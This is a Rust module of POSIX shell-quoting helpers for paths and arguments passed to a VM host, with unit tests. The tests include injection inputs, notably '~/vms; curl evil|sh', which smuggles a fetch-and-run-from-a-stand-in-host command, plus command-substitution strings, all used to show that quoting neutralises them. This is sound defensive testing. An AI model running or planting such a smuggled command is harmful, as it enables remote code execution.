//! POSIX shell quoting for arguments that cross to the VM host.
//!
//! Pure functions with no dependency on [`crate::config::Config`],
//! which is why they are here rather than beside the command
//! builders: they read as a separate unit, and their test block is
//! dense enough that a reader working on a builder had to scroll
//! past it.
//!
//! Two functions, and the difference between them is the whole
//! subtlety. [`shell_quote`] wraps the value entirely.
//! [`quote_remote_path`] leaves a leading `~` *outside* the quotes,
//! because a POSIX shell does not expand `~` inside them -- a fully
//! quoted `~/vms/p` once created a directory literally named `~`
//! while `scp` wrote to the real home directory, so the two halves
//! of `up` targeted different places.

/// Characters that carry no shell meaning, so an argument
/// made only of them needs no quoting when echoed.
fn is_plain(c: char) -> bool {
    c.is_ascii_alphanumeric()
        || matches!(
            c,
            '.' | '_' | '-' | '/' | '@' | ':' | '=' | ',' | '+' | '~'
        )
}

/// Renders one argument for display, quoting when needed.
pub(super) fn display_arg(arg: &str) -> String {
    if !arg.is_empty() && arg.chars().all(is_plain) {
        return arg.to_owned();
    }
    let mut out = String::with_capacity(arg.len() + 2);
    out.push('"');
    for c in arg.chars() {
        if matches!(c, '"' | '\\' | '$' | '`') {
            out.push('\\');
        }
        out.push(c);
    }
    out.push('"');
    out
}

/// Wraps a string in single quotes for a POSIX shell.
///
/// Embedded single quotes are closed, escaped and reopened,
/// which is the only sequence a POSIX shell accepts inside a
/// single-quoted string.
#[must_use]
pub fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Quotes a path for a POSIX shell while preserving a leading
/// `~`.
///
/// This exists because the two obvious options are both
/// wrong. Leaving the path unquoted allows injection; quoting
/// the whole path suppresses tilde expansion, because a POSIX
/// shell does **not** expand `~` inside single quotes -- so
/// `mkdir -p '~/vms/myproject'` silently creates a directory
/// literally named `~` in the home directory.
///
/// The fix is to leave only the tilde outside the quotes:
/// `~/'vms/myproject'`. Everything an attacker could influence
/// stays quoted, and the shell still expands the home
/// directory.
#[must_use]
pub fn quote_remote_path(path: &str) -> String {
    if path == "~" {
        return "~".to_owned();
    }
    match path.strip_prefix("~/") {
        Some("") => "~/".to_owned(),
        Some(rest) => format!("~/{}", shell_quote(rest)),
        None => shell_quote(path),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn quotes_a_plain_value() {
        assert_eq!(shell_quote("myproject"), "'myproject'");
    }

    #[test]
    fn quotes_a_value_containing_spaces() {
        assert_eq!(shell_quote("two words"), "'two words'");
    }

    #[test]
    fn escapes_embedded_single_quotes() {
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    #[test]
    fn quotes_an_empty_value() {
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn quotes_a_value_that_is_only_quotes() {
        assert_eq!(shell_quote("'"), r"''\'''");
    }

    #[test]
    fn quoting_neutralises_expansion_and_substitution() {
        assert_eq!(shell_quote("$HOME"), "'$HOME'");
        assert_eq!(shell_quote("`id`"), "'`id`'");
        assert_eq!(shell_quote(r"a\b"), r"'a\b'");
        assert_eq!(shell_quote("a\nb"), "'a\nb'");
    }

    #[test]
    fn remote_path_keeps_a_leading_tilde_unquoted() {
        // The whole point: `'~/vms'` is a literal `~`
        // directory, not the home directory.
        assert_eq!(quote_remote_path("~/vms/myproject"), "~/'vms/myproject'");
    }

    #[test]
    fn remote_path_passes_a_bare_tilde_through() {
        assert_eq!(quote_remote_path("~"), "~");
        assert_eq!(quote_remote_path("~/"), "~/");
    }

    #[test]
    fn remote_path_quotes_an_absolute_path_entirely() {
        assert_eq!(quote_remote_path("/srv/vms"), "'/srv/vms'");
    }

    #[test]
    fn remote_path_quotes_injection_after_the_tilde() {
        assert_eq!(
            quote_remote_path("~/vms; curl evil|sh"),
            r"~/'vms; curl evil|sh'"
        );
    }

    #[test]
    fn remote_path_does_not_expand_a_non_leading_tilde() {
        assert_eq!(quote_remote_path("/srv/~igor"), "'/srv/~igor'");
    }
}
